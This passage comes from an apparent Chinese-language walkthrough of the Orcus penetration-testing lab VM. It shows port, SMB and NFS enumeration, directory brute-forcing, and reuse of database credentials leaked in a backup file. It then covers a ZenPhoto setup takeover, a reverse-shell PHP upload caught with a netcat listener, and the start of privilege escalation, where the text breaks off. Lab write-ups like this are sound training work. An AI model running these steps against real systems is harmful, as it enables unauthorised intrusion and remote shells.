class="hljs-string">110/tcp  open  pop3        Dovecot pop3d</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-09T03:44:10</span><br><span class="hljs-string">|_Not valid after:  2026-10-09T03:44:10</span><br><span class="hljs-string">|_pop3-capabilities: UIDL STLS CAPA TOP SASL PIPELINING RESP-CODES AUTH-RESP-CODE</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="hljs-string">| rpcinfo: </span><br><span class="hljs-string">|   program version    port/proto  service</span><br><span class="hljs-string">|   100000  2,3,4        111/tcp   rpcbind</span><br><span class="hljs-string">|   100000  2,3,4        111/udp   rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/tcp6  rpcbind</span><br><span class="hljs-string">|   100000  3,4          111/udp6  rpcbind</span><br><span class="hljs-string">|   100003  2,3,4       2049/tcp   nfs</span><br><span class="hljs-string">|   100003  2,3,4       2049/tcp6  nfs</span><br><span class="hljs-string">|   100003  2,3,4       2049/udp   nfs</span><br><span class="hljs-string">|   100003  2,3,4       2049/udp6  nfs</span><br><span class="hljs-string">|   100005  1,2,3      39021/udp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      44363/tcp   mountd</span><br><span class="hljs-string">|   100005  1,2,3      48748/tcp6  mountd</span><br><span class="hljs-string">|   100005  1,2,3      57241/udp   mountd</span><br><span class="hljs-string">|   100021  1,3,4      41210/tcp6  nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      45529/tcp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      47338/udp   nlockmgr</span><br><span class="hljs-string">|   100021  1,3,4      48376/udp6  nlockmgr</span><br><span class="hljs-string">|   100227  2,3         2049/tcp   nfs_acl</span><br><span class="hljs-string">|   100227  2,3         2049/tcp6  nfs_acl</span><br><span class="hljs-string">|   100227  2,3         2049/udp   nfs_acl</span><br><span class="hljs-string">|_  100227  2,3         2049/udp6  nfs_acl</span><br><span class="hljs-string">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="hljs-string">143/tcp  open  imap        Dovecot imapd</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-09T03:44:10</span><br><span class="hljs-string">|_Not valid after:  2026-10-09T03:44:10</span><br><span class="hljs-string">|_imap-capabilities: LOGINDISABLEDA0001 IDLE more LOGIN-REFERRALS post-login IMAP4rev1 STARTTLS Pre-login SASL-IR listed ENABLE LITERAL+ capabilities OK ID have</span><br><span class="hljs-string">443/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="hljs-string">| ssh-hostkey: </span><br><span class="hljs-string">|   2048 3a:48:6e:8e:3f:32:26:f8:b6:a1:c6:b1:70:73:37:75 (RSA)</span><br><span class="hljs-string">|   256 04:55:e6:48:50:d6:93:d7:12:80:a0:68:bc:97:fa:33 (ECDSA)</span><br><span class="hljs-string">|_  256 c9:a9:c9:0d:df:7c:fc:a7:da:87:ef:d3:38:c3:f2:a6 (ED25519)</span><br><span class="hljs-string">445/tcp  open  `▒��      Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)</span><br><span class="hljs-string">993/tcp  open  ssl/imap    Dovecot imapd</span><br><span class="hljs-string">|_imap-capabilities: more IDLE ID AUTH=PLAINA0001 IMAP4rev1 LOGIN-REFERRALS Pre-login SASL-IR post-login ENABLE LITERAL+ listed capabilities OK have</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-09T03:44:10</span><br><span class="hljs-string">|_Not valid after:  2026-10-09T03:44:10</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">995/tcp  open  ssl/pop3    Dovecot pop3d</span><br><span class="hljs-string">|_pop3-capabilities: UIDL USER CAPA TOP SASL(PLAIN) PIPELINING RESP-CODES AUTH-RESP-CODE</span><br><span class="hljs-string">| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server</span><br><span class="hljs-string">| Not valid before: 2016-10-09T03:44:10</span><br><span class="hljs-string">|_Not valid after:  2026-10-09T03:44:10</span><br><span class="hljs-string">|_ssl-date: TLS randomness does not represent time</span><br><span class="hljs-string">2049/tcp open  nfs         2-4 (RPC #100003)</span><br><span class="hljs-string">MAC Address: 08:00:27:EB:CE:6D (Oracle VirtualBox virtual NIC)</span><br><span class="hljs-string">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="hljs-string">Device type: general purpose</span><br><span class="hljs-string">Running: Linux 3.X|4.X</span><br><span class="hljs-string">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="hljs-string">OS details: Linux 3.2 - 4.9</span><br><span class="hljs-string">Network Distance: 1 hop</span><br><span class="hljs-string">Service Info: Host: ORCUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="hljs-string"></span><br><span class="hljs-string">Host script results:</span><br><span class="hljs-string">| smb2-time: </span><br><span class="hljs-string">|   date: 2023-09-20T14:32:50</span><br><span class="hljs-string">|_  start_date: N/A</span><br><span class="hljs-string">|_nbstat: NetBIOS name: ORCUS, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="hljs-string">| smb-os-discovery: </span><br><span class="hljs-string">|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)</span><br><span class="hljs-string">|   Computer name: \x00</span><br><span class="hljs-string">|   NetBIOS computer name: ORCUS\x00</span><br><span class="hljs-string">|   Workgroup: WORKGROUP\x00</span><br><span class="hljs-string">|_  System time: 2023-09-20T10:32:50-04:00</span><br><span class="hljs-string">|_clock-skew: mean: 9h19m58s, deviation: 2h18m34s, median: 7h59m57s</span><br><span class="hljs-string">| smb-security-mode: </span><br><span class="hljs-string">|   account_used: guest</span><br><span class="hljs-string">|   authentication_level: user</span><br><span class="hljs-string">|   challenge_response: supported</span><br><span class="hljs-string">|_  message_signing: disabled (dangerous, but default)</span><br><span class="hljs-string">| smb2-security-mode: </span><br><span class="hljs-string">|   3:1:1: </span><br><span class="hljs-string">|_    Message signing enabled but not required</span><br></code></pre></td></tr></table></figure><p>ubuntu 操作系统，443 也是 ssh 端口，网站目录下包含 robots.txt</p><p><img src="/pic/6e0292976936eb0a8c53959ae948dd7e_MD5.png"></p><h2 id="目录爆破"><a href="#目录爆破" class="headerlink" title="目录爆破"></a>目录爆破</h2><p>尝试对 robots.txt 中的各个目录进行查看，同时使用目录爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/tmp]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.143/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -x php,html,sql,rar,zip,txt<br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.143/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Extensions:              txt,php,html,sql,rar,zip<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/20 05:38:01 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/index.html           (Status: 200) [Size: 101]<br>/.php                 (Status: 403) [Size: 293]<br>/.html                (Status: 403) [Size: 294]<br>/files                (Status: 301) [Size: 316] [--&gt; http://192.168.56.143/files/]<br>/themes               (Status: 301) [Size: 317] [--&gt; http://192.168.56.143/themes/]<br>/login.php            (Status: 302) [Size: 0] [--&gt; http://192.168.56.143/index.php?controller=login&amp;action=showlogin]                                                                                                                   <br>/admin                (Status: 301) [Size: 316] [--&gt; http://192.168.56.143/admin/]<br>/index.php            (Status: 200) [Size: 4567]<br>/test.php             (Status: 200) [Size: 0]<br>/install              (Status: 301) [Size: 318] [--&gt; http://192.168.56.143/install/]<br>/thumb.php            (Status: 302) [Size: 0] [--&gt; /framework/core/assets/images/default_preview_notfound.gif]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.143/javascript/]<br>/external             (Status: 301) [Size: 319] [--&gt; http://192.168.56.143/external/]<br>/notes.php            (Status: 200) [Size: 0]<br>/connect.php          (Status: 200) [Size: 0]<br>/robots.txt           (Status: 200) [Size: 1347]<br>/cron                 (Status: 301) [Size: 315] [--&gt; http://192.168.56.143/cron/]<br>/tmp                  (Status: 301) [Size: 314] [--&gt; http://192.168.56.143/tmp/]<br>/LICENSE              (Status: 200) [Size: 15437]<br>/framework            (Status: 301) [Size: 320] [--&gt; http://192.168.56.143/framework/]<br>/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.143/phpmyadmin/]<br>/reset.php            (Status: 302) [Size: 0] [--&gt; http://192.168.56.143/index.php?section=SITE_DEFAULT_SECTION]<br>/backups              (Status: 301) [Size: 318] [--&gt; http://192.168.56.143/backups/]<br>/webalizer            (Status: 200) [Size: 0]<br>/xmlrpc.php           (Status: 200) [Size: 0]<br>/selector.php         (Status: 200) [Size: 0]<br>/FCKeditor            (Status: 301) [Size: 320] [--&gt; http://192.168.56.143/FCKeditor/]<br>/.php                 (Status: 403) [Size: 293]<br>/.html                (Status: 403) [Size: 294]<br>/server-status        (Status: 403) [Size: 302]<br>/overrides.php        (Status: 200) [Size: 0]<br>/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 545]<br>/site_rss.php         (Status: 302) [Size: 0] [--&gt; http://192.168.56.143/index.php?controller=rss&amp;action=feed]<br>Progress: 8914966 / 8916838 (99.98%)<br>===============================================================<br>2023/09/20 06:06:39 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><p>admin 目录的源码中有这样一句注释 <code>This is a backup taken from the backups/</code>，访问 backups 发现了两个文件，ssh-creds.bak 权限限制了读取</p><p><img src="/pic/e61d8e22d89218e78cea0bfae7c11c81_MD5.png"></p><h2 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h2><p>压缩文件解压后在本地进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus/SimplePHPQuiz]<br>└─$ tree        <br>.<br>├── add_quiz.php<br>├── css<br>│   ├── bootstrap.css<br>│   ├── bootstrap.css.map<br>│   ├── bootstrap.min.css<br>│   ├── bootstrap-theme.css<br>│   ├── bootstrap-theme.css.map<br>│   ├── bootstrap-theme.min.css<br>│   └── theme.css<br>├── fonts<br>│   ├── glyphicons-halflings-regular.eot<br>│   ├── glyphicons-halflings-regular.svg<br>│   ├── glyphicons-halflings-regular.ttf<br>│   └── glyphicons-halflings-regular.woff<br>├── includes<br>│   ├── db_conn.php<br>│   ├── footer.html<br>│   ├── functions_list.php<br>│   ├── header.html<br>│   ├── validation_functions.php<br>│   └── view_result.php<br>├── index.php<br>├── js<br>│   ├── bootstrap.js<br>│   └── bootstrap.min.js<br>├── process_quizAdd.php<br>├── quiz.php<br>├── README.md<br>├── samplequiz.php<br>└── view_result.php<br><br>5 directories, 26 files<br></code></pre></td></tr></table></figure><p>在 include 文件夹中的 <code>db_conn.php</code> 发现了数据库用户名和密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus/SimplePHPQuiz]<br>└─$ <span class="hljs-built_in">cat</span> includes/db_conn.php <br>&lt;?php <br><br>//Set the database access information as constants<br>DEFINE (<span class="hljs-string">&#x27;DB_USER&#x27;</span>, <span class="hljs-string">&#x27;dbuser&#x27;</span>);<br>DEFINE (<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;dbpassword&#x27;</span>);<br>DEFINE (<span class="hljs-string">&#x27;DB_HOST&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>DEFINE (<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;quizdb&#x27;</span>);<br><br>@ <span class="hljs-variable">$dbc</span> = new mysqli(DB_HOST, DB_USER, DB_PASSWORD, DB_NAME);<br><br><span class="hljs-keyword">if</span> (mysqli_connect_error())&#123;<br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;Could not connect to MySql. Please try again&quot;</span>;<br>        <span class="hljs-built_in">exit</span>();<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><p>目录爆破的结果中有 phpmyadmin，尝试使用上述口令登录</p><p><img src="/pic/3b6d97c85465e5c9c94a5363aabf33b1_MD5.png"></p><p>但是翻了一遍，就只找到了一个邮箱，和两个密码哈希，但是在线网站中没有结果。考虑在此处 getshell，但是被限制了可写入的文件夹。</p><p><img src="/pic/140e48a93c4c283d23b16edfc1a1ec7a_MD5.png"></p><p>在这里卡了许久。尝试了对各个目录再次进行查看</p><p>login 目录报错数据库离线</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http://<span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.143</span>/<span class="hljs-keyword">index</span>.php?controller=<span class="hljs-keyword">login</span>&amp;action=showlogin<br>This site <span class="hljs-keyword">is</span> currently down <span class="hljs-keyword">for</span> maintenance.<br><span class="hljs-keyword">Database</span> <span class="hljs-keyword">is</span> currently <span class="hljs-keyword">Off</span>-<span class="hljs-type">line</span>!<br></code></pre></td></tr></table></figure><p>各种 md 文件是此 cms 的相关文件，尝试搜索此 cms 的漏洞，找到的是 sql 注入漏洞，但是数据库没连接上，这个漏洞意义不大，本地包含漏洞利用失败，可能是版本不对</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">/TODO<span class="hljs-selector-class">.md</span><br>Exponent <span class="hljs-attribute">Content</span> Management System<br></code></pre></td></tr></table></figure><p>还有一些包含文件或文件夹的目录，其中也没有敏感信息</p><p><img src="/pic/cf95205712b917a93d36f539dc8f9d50_MD5.png"></p><h2 id="SMB-和-NFS-查看"><a href="#SMB-和-NFS-查看" class="headerlink" title="SMB 和 NFS 查看"></a>SMB 和 NFS 查看</h2><p>尝试对 smb 和 nfs 进行测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ sudo smbmap -H 192.168.56.143                     <br>[sudo] password <span class="hljs-keyword">for</span> kali: <br>[+] Guest session       IP: 192.168.56.143:445  Name: 192.168.56.143                                    <br>        Disk                                                    Permissions     Comment<br>        ----                                                    -----------     -------<br>        <span class="hljs-built_in">print</span>$                                                  NO ACCESS       Printer Drivers<br>        IPC$                                                    NO ACCESS       IPC Service (Orcus server (Samba, Ubuntu))<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ sudo nmap --script=smb-enum-shares.nse,smb-enum-users.nse 192.168.56.143<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-20 02:44 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.143<br>Host is up (0.00087s latency).<br>Not shown: 988 closed tcp ports (reset)<br>PORT     STATE SERVICE<br>22/tcp   open  ssh<br>53/tcp   open  domain<br>80/tcp   open  http<br>110/tcp  open  pop3<br>111/tcp  open  rpcbind<br>139/tcp  open  netbios-ssn<br>143/tcp  open  imap<br>443/tcp  open  https<br>445/tcp  open  microsoft-ds<br>993/tcp  open  imaps<br>995/tcp  open  pop3s<br>2049/tcp open  nfs<br>MAC Address: 08:00:27:EB:CE:6D (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>| smb-enum-shares: <br>|   account_used: guest<br>|   \\192.168.56.143\IPC$: <br>|     Type: STYPE_IPC_HIDDEN<br>|     Comment: IPC Service (Orcus server (Samba, Ubuntu))<br>|     Users: 2<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\tmp<br>|     Anonymous access: READ/WRITE<br>|     Current user access: READ/WRITE<br>|   \\192.168.56.143\<span class="hljs-built_in">print</span>$: <br>|     Type: STYPE_DISKTREE<br>|     Comment: Printer Drivers<br>|     Users: 0<br>|     Max Users: &lt;unlimited&gt;<br>|     Path: C:\var\lib\samba\printers<br>|     Anonymous access: &lt;none&gt;<br>|_    Current user access: &lt;none&gt;<br>| smb-enum-users: <br>|   ORCUS\root (RID: 1001)<br>|     Full name:   root<br>|     Description: <br>|     Flags:       Normal user account<br>|   ORCUS\viper (RID: 1000)<br>|     Full name:   viper<br>|     Description: <br>|_    Flags:       Normal user account<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.42 seconds<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ showmount -e 192.168.56.143                                              <br>Export list <span class="hljs-keyword">for</span> 192.168.56.143:<br>/tmp *<br></code></pre></td></tr></table></figure><p>得到了一个可能的用户名 <code>viper</code> ，挂载点是 tmp 目录，似乎意义不大（</p><p>尝试了一下用数据库密码来 ssh 爆破一下，失败。</p><p>束手无策.jpg，看 WP，字典问题我是没考虑到的，上次也是在目录爆破卡住，难绷</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/tmp]<br>└─$ sudo gobuster <span class="hljs-built_in">dir</span> -u http://192.168.56.143/ -w /usr/share/seclists/Discovery/Web-Content/big.txt <br>===============================================================<br>Gobuster v3.5<br>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)<br>===============================================================<br>[+] Url:                     http://192.168.56.143/<br>[+] Method:                  GET<br>[+] Threads:                 10<br>[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/big.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.5<br>[+] Timeout:                 10s<br>===============================================================<br>2023/09/20 06:18:48 Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode<br>===============================================================<br>/.htaccess            (Status: 403) [Size: 298]<br>/.htpasswd            (Status: 403) [Size: 298]<br>/FCKeditor            (Status: 301) [Size: 320] [--&gt; http://192.168.56.143/FCKeditor/]<br>/LICENSE              (Status: 200) [Size: 15437]<br>/admin                (Status: 301) [Size: 316] [--&gt; http://192.168.56.143/admin/]<br>/backups              (Status: 301) [Size: 318] [--&gt; http://192.168.56.143/backups/]<br>/cron                 (Status: 301) [Size: 315] [--&gt; http://192.168.56.143/cron/]<br>/external             (Status: 301) [Size: 319] [--&gt; http://192.168.56.143/external/]<br>/files                (Status: 301) [Size: 316] [--&gt; http://192.168.56.143/files/]<br>/framework            (Status: 301) [Size: 320] [--&gt; http://192.168.56.143/framework/]<br>/install              (Status: 301) [Size: 318] [--&gt; http://192.168.56.143/install/]<br>/javascript           (Status: 301) [Size: 321] [--&gt; http://192.168.56.143/javascript/]<br>/phpmyadmin           (Status: 301) [Size: 321] [--&gt; http://192.168.56.143/phpmyadmin/]<br>/robots.txt           (Status: 200) [Size: 1347]<br>/server-status        (Status: 403) [Size: 302]<br>/sitemap.xml          (Status: 200) [Size: 113]<br>/themes               (Status: 301) [Size: 317] [--&gt; http://192.168.56.143/themes/]<br>/tmp                  (Status: 301) [Size: 314] [--&gt; http://192.168.56.143/tmp/]<br>/webalizer            (Status: 200) [Size: 0]<br>/zenphoto             (Status: 301) [Size: 319] [--&gt; http://192.168.56.143/zenphoto/]<br><br>===============================================================<br>2023/09/20 06:18:51 Finished<br>===============================================================<br></code></pre></td></tr></table></figure><h2 id="ZENphoto-安装"><a href="#ZENphoto-安装" class="headerlink" title="ZENphoto 安装"></a>ZENphoto 安装</h2><p><code>/zenphoto</code> 目录进入后，是安装界面，提示 MySQL 连接有问题，正好我们有用户名和密码</p><p><img src="/pic/fa65d065fe2bf3da4cbde9fff41c1dc8_MD5.png"></p><p>填入后点击 save</p><p><img src="/pic/6fc7154cc8c7c6d783495010dfdab65b_MD5.png"></p><p>点击 apply</p><p><img src="/pic/4d7976745c0d97918f04a31693f31db9_MD5.png"></p><p>点击 go</p><p><img src="/pic/e758783047369cc87527bf523f2aed8e_MD5.png"></p><p>安装成功，接下来提示需要设置 admin 用户和密码</p><p>设置 <code>admin:admin123</code> 为口令，点击 apply</p><p><img src="/pic/3e8252475abcc2d6821e091be7e359f3_MD5.png"></p><p>接下来自动跳转到登录界面，使用我们设定好的密码来登录</p><h2 id="后台-getshell"><a href="#后台-getshell" class="headerlink" title="后台 getshell"></a>后台 getshell</h2><p>原本想去网上搜一搜 zenphoto 后台如何 getshell，但是资料太少了，自己一点点探索吧，先大致把功能看一遍，感觉是个管理照片的 cms</p><p>在上传页面中可以看到，zip 也需要解压后是图片格式，简单尝试了一下，可能是白名单，没法直接上传 php 文件</p><p><img src="/pic/256c3f24670f259cf580c449f49a0d9c_MD5.png"></p><p>插件页面里看到一个可能有帮助的插件，描述中说明了它可以对上传文件进行简单管理</p><p>激活后，上传界面多了个选项</p><p><img src="/pic/e20ff4c38d326938ad14d13896a7b342_MD5.png"></p><p>新建个文件，然后把反弹 shell 的代码放进去</p><p><img src="/pic/eca4d2590292f0c1881ec01fadd47909_MD5.png"></p><p>提前开启监听，访问路径 <code>http://192.168.56.143/zenphoto/zp-data/test.php</code> 来反弹 shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/Orcus]<br>└─$ sudo nc -lvnp 443<br>listening on [any] 443 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.143] 45566<br>Linux Orcus 4.4.0-45-generic <span class="hljs-comment">#66-Ubuntu SMP Wed Oct 19 14:12:05 UTC 2016 i686 athlon i686 GNU/Linux</span><br> 06:48:46 up 6 min,  0 <span class="hljs-built_in">users</span>,  load average: 0.00, 0.00, 0.00<br>USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) <span class="hljs-built_in">groups</span>=33(www-data)<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1560): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@Orcus:/$ sudo -l<br>sudo -l<br>sudo: unable to resolve host Orcus: Connection timed out<br>sudo: no <span class="hljs-built_in">tty</span> present and no askpass program specified<br>www-data@Orcus:/$ <span class="hljs-built_in">which</span> python<br><span class="hljs-built_in">which</span> python<br>/usr/bin/python<br>www-data@Orcus:/$ python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>python -c <span class="hljs-string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br>www-data@Orcus:/$ sudo -l<br>sudo -l<br>sudo: unable to resolve host Orcus: Connection timed out<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try again.<br>[sudo] password <span class="hljs-keyword">for</span> www-data: <br><br>Sorry, try 